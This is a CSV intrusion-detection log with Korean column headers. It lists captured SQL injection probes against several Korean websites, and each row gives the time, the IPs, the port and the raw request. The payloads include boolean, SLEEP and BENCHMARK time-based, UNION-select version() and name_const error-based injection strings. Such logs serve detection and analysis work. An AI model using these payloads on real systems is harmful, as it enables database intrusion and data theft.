장비발생시간,출발지IP,목적지IP,목적지포트,공격명,raw_data
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filepath=/data/program/20160308/&filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp%25%27%20aND%20%278%25%27%3D%278
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/%27/**/aND/**/%278%27%3D%273
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/%25%27%20aND%20%278%25%27%3D%278
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filepath=/data/program/20160308/&filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp%27/**/aND/**/%278%27%3D%278
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filepath=/data/program/20160308/&filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp%27/**/aND/**/%278%27%3D%273
2019-03-21 7:00,123.207.28.147,112.175.173.103,80,SqlInjection, /section/newsview.php?idxno=10124%2F%00%27%7C%7CSLeeP%283%29%26%26%271
2019-03-21 7:09,211.149.192.184,112.175.173.103,80,SqlInjection," /section/newsview.php?idxno=10124/%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%22x%22=%22x"
2019-03-21 7:09,211.149.192.184,112.175.173.103,80,SqlInjection, /section/newsview.php?idxno=10124%2F%00%27%7C%7CSLeeP%283%29%26%26%271
2019-03-21 7:09,211.149.192.184,112.175.173.103,80,SqlInjection, /section/newsview.php?idxno=10124%2F%27%20AnD%20sLeep%283%29%20ANd%20%271
2019-03-21 7:09,211.149.192.184,112.175.173.103,80,SqlInjection, /section/newsview.php?idxno=10124%2F%27%26%26sLEEp%283%29%26%26%271
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filepath=/data/program/20160308/&filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp%25%27%20aND%20%278%25%27%3D%273
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/%25%27%09aND%09%278%27%3D%278
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/%25%27%09aND%09%278%25%27%3D%273
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filepath=/data/program/20160308/&filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp%25%27%09aND%09%278%27%3D%278
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filepath=/data/program/20160308/&filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp%25%27%09aND%09%278%25%27%3D%273
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filepath=/data/program/20160308/&filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp%27%20aND%20%278%27%3D%273
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/%25%27%20aND%20%278%25%27%3D%273
2019-03-21 7:36,36.232.133.51,192.168.100.89,80,SqlInjection, /common/down.php?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/?filename=%EA%B5%AC%EC%97%B0%EB%8F%99%ED%99%94%20%ED%99%8D%EB%B3%B4%EC%A7%80.hwp&filepath=/data/program/20160308/%27%20aND%20%278%27%3D%273
2019-03-21 7:09,211.149.192.184,112.175.173.103,80,SqlInjection, /section/newsview.php?idxno=10124%2F%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271
2019-03-21 7:09,211.149.192.184,112.175.173.103,80,SqlInjection, /section/newsview.php?idxno=10124/999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1
2019-03-21 7:09,211.149.192.184,112.175.173.103,80,SqlInjection, /section/newsview.php?idxno=10124%2F%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271
2019-03-21 7:09,211.149.192.184,112.175.173.103,80,SqlInjection, /section/newsview.php?idxno=10124%2F%27%20AnD%20sLeep%283%29%20ANd%20%270%27%3D%270
2019-03-21 6:16,142.93.68.167,222.122.208.131,80,SqlInjection," /department/board/view.jsp?SITE_GRP=DEPARTMENT05&BRD_NO=690943&m=13134&P_NUM=1&cP_NUM=1%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%22x%22=%22x"
2019-03-21 6:15,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&StartDay=&EndDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=&block=%27%20and%20%27x%27%3D%27y
2019-03-21 6:15,142.93.68.167,222.122.208.131,80,SqlInjection, /department/board/view.jsp?BRD_NO=690943&m=13134&P_NUM=1&cP_NUM=1&SITE_GRP=DEPARTMENT05%22%20and%20%22x%22%3D%22y
2019-03-21 6:15,142.93.68.167,222.122.208.131,80,SqlInjection, /department/board/view.jsp?BRD_NO=690943&m=13134&P_NUM=1&cP_NUM=1&SITE_GRP=DEPARTMENT05%27%20and%20%27x%27%3D%27y
2019-03-21 6:15,142.93.68.167,222.122.208.131,80,SqlInjection," /department/board/view.jsp?BRD_NO=690943&m=13134&P_NUM=1&cP_NUM=1&SITE_GRP=DEPARTMENT05""%20and%20""x""%3D""x"
2019-03-21 6:16,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&StartDay=&EndDay=&Place_Value=&Field_Value=&search_chk=&Companyname_Value=%20and%201%3D1
2019-03-21 6:15,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&EndDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=&StartDay=%20and%201%3D1
2019-03-21 6:15,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&StartDay=&EndDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=&block=%20AND%201=1
2019-03-21 6:15,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&EndDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=&StartDay=%27%20and%20%27x%27%3D%27y
2019-03-21 6:16,142.93.68.167,222.122.208.131,80,SqlInjection, /department/board/view.jsp?SITE_GRP=DEPARTMENT05&m=13134&P_NUM=1&cP_NUM=1&BRD_NO=690943%27%20and%20%27x%27%3D%27y
2019-03-21 6:16,142.93.68.167,222.122.208.131,80,SqlInjection," /department/board/view.jsp?SITE_GRP=DEPARTMENT05&m=13134&P_NUM=1&cP_NUM=1&BRD_NO=690943""%20and%20""x""%3D""x"
2019-03-21 6:16,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&StartDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=&EndDay=%20and%201%3D1
2019-03-21 6:16,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&StartDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=&EndDay=%27%20and%20%27x%27%3D%27x
2019-03-21 6:16,213.232.126.76,10.252.103.23,80,SqlInjection," /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&StartDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=&EndDay=""%20and%20""x""%3D""x"
2019-03-21 6:16,142.93.68.167,222.122.208.131,80,SqlInjection, /department/board/view.jsp?SITE_GRP=DEPARTMENT05&BRD_NO=690943&m=13134&c&P_NUM=1%22%20and%20%22x%22%3D%22y
2019-03-21 6:16,142.93.68.167,222.122.208.131,80,SqlInjection, /department/board/view.jsp?SITE_GRP=DEPARTMENT05&BRD_NO=690943&m=13134&c&P_NUM=1%20AND%201=1
2019-03-21 6:16,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&StartDay=&EndDay=&Field_Value=&Companyname_Value=&search_chk=&Place_Value=%20and%201%3E1
2019-03-21 6:15,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&EndDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=&StartDay=%20AND%201=1
2019-03-21 6:16,142.93.68.167,222.122.208.131,80,SqlInjection, /department/board/view.jsp?SITE_GRP=DEPARTMENT05&BRD_NO=690943&P_NUM=1&cP_NUM=1&m=13134%27%20and%20%27x%27%3D%27x
2019-03-21 6:16,142.93.68.167,222.122.208.131,80,SqlInjection, /department/board/view.jsp?SITE_GRP=DEPARTMENT05&BRD_NO=690943&P_NUM=1&cP_NUM=1&m=13134%27%20and%20%27x%27%3D%27y
2019-03-21 6:16,142.93.68.167,222.122.208.131,80,SqlInjection," /department/board/view.jsp?SITE_GRP=DEPARTMENT05&BRD_NO=690943&P_NUM=1&cP_NUM=1&m=13134""%20and%20""x""%3D""x"
2019-03-21 6:17,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&StartDay=&EndDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=%27%20and%20%27x%27%3D%27y
2019-03-21 6:17,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&StartDay=&EndDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=%20and%201%3D1
2019-03-21 6:16,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&StartDay=&EndDay=&Place_Value=&Field_Value=&search_chk=&Companyname_Value=%20AND%201=1
2019-03-21 6:17,213.232.126.76,10.252.103.23,80,SqlInjection, /DB/Recruit/JobOffer/Detail.asp?an=1547&cnt=10&page=1&block=&StartDay=&EndDay=&Place_Value=&Field_Value=&Companyname_Value=&search_chk=%20AND%201=1
2019-03-21 6:34,35.225.181.213,10.10.42.111,443,SqlInjection, /djc/community-board-detail.do?id=238285&postId=108086299999%22%20union%20select%20unhex(hex(version()))%20--%20%22x%22=%22x
2019-03-21 6:34,35.225.181.213,10.10.42.111,443,SqlInjection, /djc/community-board-detail.do?id=238285&postId=1080862999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1
2019-03-21 6:33,35.225.181.213,10.10.42.111,443,SqlInjection, /djc/community-board-detail.do?postId=1080862&id=238285%27%20and%20%27x%27%3D%27y
2019-03-21 6:12,92.222.170.161,112.175.173.96,80,SqlInjection, /view/news_view.php?varAtcId=4918%00%27%7C%7CSLeeP%283%29%26%26%271
2019-03-21 6:12,92.222.170.161,112.175.173.96,80,SqlInjection, /view/news_view.php?varAtcId=4918%20AnD%20BeNChMaRK%282999999%2CMD5%28NOW%28%29%29%29
2019-03-21 6:13,92.222.170.161,112.175.173.96,80,SqlInjection, /view/news_view.php?varAtcId=491899999%27%20union%20select%20unhex(hex(version()))%20--%20%27x%27=%27x
2019-03-21 6:13,92.222.170.161,112.175.173.96,80,SqlInjection, /view/news_view.php?varAtcId=491899999%22%20union%20select%20unhex(hex(version()))%20--%20%22x%22=%22x
2019-03-21 6:13,92.222.170.161,112.175.173.96,80,SqlInjection," /view/news_view.php?varAtcId=4918%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%22x%22=%22x"
2019-03-21 6:43,180.76.252.1,112.175.173.103,80,SqlInjection, /section/newsview.php?idxno=10124%2F%27%20AnD%20sLeep%283%29%20ANd%20%271
2019-03-21 6:34,35.225.181.213,10.10.42.111,443,SqlInjection," /djc/community-board-detail.do?id=238285&postId=1080862""%20and%20""x""%3D""x"
2019-03-21 6:34,35.225.181.213,10.10.42.111,443,SqlInjection, /djc/community-board-detail.do?id=238285&postId=1080862%20and%201%3D1
2019-03-21 6:34,35.225.181.213,10.10.42.111,443,SqlInjection," /djc/community-board-detail.do?id=238285&postId=1080862%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%22x%22=%22x"
2019-03-21 5:20,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?gisa_id=00127868&cate_code=0405/99999%27%20union%20select%20unhex(hex(version()))%20--%20%27x%27=%27x
2019-03-21 5:20,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?gisa_id=00127868&cate_code=0405/99999%22%20union%20select%20unhex(hex(version()))%20--%20%22x%22=%22x
2019-03-21 5:19,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?cate_code=0405/&gisa_id=00127868%20AND%201=1
2019-03-21 5:20,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?cate_code=0405%2F&gisa_id=00127868%27%20AnD%20sLeep%283%29%20ANd%20%270%27%3D%270
2019-03-21 5:20,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?cate_code=0405%2F&gisa_id=00127868%26%26SlEEp%283%29
2019-03-21 5:20,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?cate_code=0405%2F&gisa_id=00127868%27%20AnD%20sLeep%283%29%20ANd%20%271
2019-03-21 5:20,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?cate_code=0405%2F&gisa_id=00127868%27%26%26sLEEp%283%29%26%26%271
2019-03-21 5:20,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?cate_code=0405%2F&gisa_id=00127868%00%27%7C%7CSLeeP%283%29%26%26%271
2019-03-21 5:20,112.78.10.32,211.169.240.71,80,SqlInjection," /mm_theme_view.php?gisa_id=00127868&cate_code=0405/%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%22x%22=%22x"
2019-03-21 5:20,112.78.10.32,211.169.240.71,80,SqlInjection," /mm_theme_view.php?gisa_id=00127868&cate_code=0405/%27%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%27x%27=%27x"
2019-03-21 5:19,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?cate_code=0405%2F&gisa_id=00127868%20AnD%20BeNChMaRK%282999999%2CMD5%28NOW%28%29%29%29
2019-03-21 5:19,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?cate_code=0405%2F&gisa_id=00127868%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271
2019-03-21 5:19,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?gisa_id=00127868&cate_code=0405/999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1
2019-03-21 5:19,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?cate_code=0405%2F&gisa_id=00127868%26%26BeNChMaRK%282999999%2CMD5%28NOW%28%29%29%29
2019-03-21 5:19,112.78.10.32,211.169.240.71,80,SqlInjection, /mm_theme_view.php?cate_code=0405%2F&gisa_id=00127868%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271
2019-03-21 3:13,185.234.218.22,112.175.173.96,80,SqlInjection, /view/news_view.php?varAtcId=2067'||lower('')||'
2019-03-21 2:14,175.45.11.46,112.175.8.11,80,SqlInjection," GET /center/mall/item_main_list.asp?main_category=60'+and+1=1+--+ HTTP/1.1 Accept-Encoding: gzip, deflate Connection: close Cookie: member_service=3; locale=EN; service_code=loa Host: luminary.valofe.com Referer: http://luminary.valofe.com/center/mall/item_main_list.asp?main_category=60'+and+1=1+--+ User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) "
2019-03-21 2:14,124.167.248.230,112.175.8.11,80,SqlInjection, /center/news/newsletter.asp?board_seq=104+and+1=1--
2019-03-21 2:24,47.75.195.213,112.175.8.11,80,SqlInjection, /center/mall/product_view.asp?product_seq=1197+and+1=1--
2019-03-21 2:22,202.104.102.162,112.175.8.11,80,SqlInjection," GET /center/mall/item_main_list.asp?menu=82&main_category=10'+and+1=1+--+ HTTP/1.1 Accept-Encoding: gzip, deflate Connection: close Cookie: member_service=3; locale=EN; service_code=loa Host: luminary.valofe.com Referer: http://luminary.valofe.com/center/mall/item_main_list.asp?menu=82&main_category=10'+and+1=1+--+ User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) "
2019-03-21 2:22,41.216.163.46,112.175.8.11,80,SqlInjection," GET /center/mall/item_main_list.asp?menu=82&main_category=10'+and+1=1+--+ HTTP/1.1 Accept-Encoding: gzip, deflate Connection: close Cookie: member_service=3; locale=EN; service_code=loa Host: luminary.valofe.com Referer: http://luminary.valofe.com/center/mall/item_main_list.asp?menu=82&main_category=10'+and+1=1+--+ User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) "
2019-03-21 2:22,220.172.105.45,112.175.8.11,80,SqlInjection, /center/mall/item_main_list.asp?menu=82&main_category=10+and+1=1--
2019-03-21 2:24,47.75.254.107,112.175.8.11,80,SqlInjection," GET /center/mall/product_view.asp?product_seq=1197'+and+1=1+--+ HTTP/1.1 Accept-Encoding: gzip, deflate Connection: close Cookie: member_service=3; locale=EN; service_code=loa Host: luminary.valofe.com Referer: http://luminary.valofe.com/center/mall/product_view.asp?product_seq=1197'+and+1=1+--+ User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) "
2019-03-21 2:24,117.166.86.229,112.175.8.11,80,SqlInjection, /center/mall/product_view.asp?product_seq=1197+and+1=1--
2019-03-21 2:32,70.32.28.4,211.169.240.71,80,SqlInjection, /play/flash_board/wwwboardview.php?tablename=flashgame&indexid=119/%27%20and%20%27x%27%3D%27y
2019-03-21 2:32,70.32.28.4,211.169.240.71,80,SqlInjection," /play/flash_board/wwwboardview.php?tablename=flashgame&indexid=119/""%20and%20""x""%3D""x"
2019-03-21 2:32,70.32.28.4,211.169.240.71,80,SqlInjection, /play/flash_board/wwwboardview.php?indexid=119%2F&tablename=flashgame%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271
2019-03-21 2:32,70.32.28.4,211.169.240.71,80,SqlInjection, /play/flash_board/wwwboardview.php?indexid=119%2F&tablename=flashgame%27%20AnD%20sLeep%283%29%20ANd%20%270%27%3D%270
2019-03-21 2:32,70.32.28.4,211.169.240.71,80,SqlInjection, /play/flash_board/wwwboardview.php?tablename=flashgame&indexid=119/%27%20and%20%27x%27%3D%27x
2019-03-21 2:32,70.32.28.4,211.169.240.71,80,SqlInjection, /play/flash_board/wwwboardview.php?indexid=119%2F&tablename=flashgame%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271
2019-03-21 2:32,70.32.28.4,211.169.240.71,80,SqlInjection, /play/flash_board/wwwboardview.php?indexid=119/&tablename=flashgame%20and%201%3E1
2019-03-21 2:32,70.32.28.4,211.169.240.71,80,SqlInjection, /play/flash_board/wwwboardview.php?indexid=119/&tablename=flashgame%27%20and%20%27x%27%3D%27x
2019-03-21 2:32,70.32.28.4,211.169.240.71,80,SqlInjection, /play/flash_board/wwwboardview.php?indexid=119/&tablename=flashgame%20and%201%3D1
2019-03-21 2:30,202.104.102.162,112.175.8.11,80,SqlInjection, /center/news/view.asp?menu=11&board_seq=103&list_seq=18374+and+1=1--
2019-03-21 0:59,153.92.0.8,110.45.246.33,443,SqlInjection, /torimaru/menu.asp?menucate=5999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1
2019-03-21 0:59,153.92.0.8,110.45.246.33,443,SqlInjection," /torimaru/menu.asp?menucate=5%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%22x%22=%22x"
2019-03-21 0:05,209.18.90.16,112.175.8.11,80,SqlInjection, /center/forum/forums/thread-view.asp?tid=22702999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1
2019-03-21 0:05,209.18.90.16,112.175.8.11,80,SqlInjection, /center/forum/forums/thread-view.asp?tid=22702%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271
2019-03-21 0:05,209.18.90.16,112.175.8.11,80,SqlInjection, /center/forum/forums/thread-view.asp?tid=22702%00%27%7C%7CSLeeP%283%29%26%26%271
2019-03-21 0:05,209.18.90.16,112.175.8.11,80,SqlInjection, /center/forum/forums/thread-view.asp?tid=22702%27%26%26sLEEp%283%29%26%26%271
2019-03-21 0:05,209.18.90.16,112.175.8.11,80,SqlInjection, /center/forum/forums/thread-view.asp?tid=22702%20AND%201=1
2019-03-21 0:48,185.179.191.135,112.175.8.11,80,SqlInjection, /center/forum/forums/thread-view.asp?start=26/&tid=18073%20AND%201=1
2019-03-21 0:50,185.179.191.135,112.175.8.11,80,SqlInjection, /center/forum/forums/thread-view.asp?amp;start=26%2F&tid=18073%00%27%7C%7CSLeeP%283%29%26%26%271
2019-03-21 0:50,185.179.191.135,112.175.8.11,80,SqlInjection, /center/forum/forums/thread-view.asp?amp;start=26%2F&tid=18073%27%20AnD%20sLeep%283%29%20ANd%20%270%27%3D%270
2019-03-21 0:50,185.179.191.135,112.175.8.11,80,SqlInjection, /center/forum/forums/thread-view.asp?tid=18073&amp;start=26/99999%22 union select unhex(hex(version())) -- %22x%22=%22x
2019-03-21 0:50,185.179.191.135,112.175.8.11,80,SqlInjection, /center/forum/forums/thread-view.asp?amp;start=26%2F&tid=18073%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271
2019-03-21 0:59,153.92.0.8,110.45.246.33,443,SqlInjection, /torimaru/menu.asp?menucate=599999%27%20union%20select%20unhex(hex(version()))%20--%20%27x%27=%27x
2019-03-21 0:59,153.92.0.8,110.45.246.33,443,SqlInjection," /torimaru/menu.asp?menucate=5%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20and%201%3D1"
2019-03-21 0:59,153.92.0.8,110.45.246.33,443,SqlInjection, /torimaru/menu.asp?menucate=5%20AND%201=1
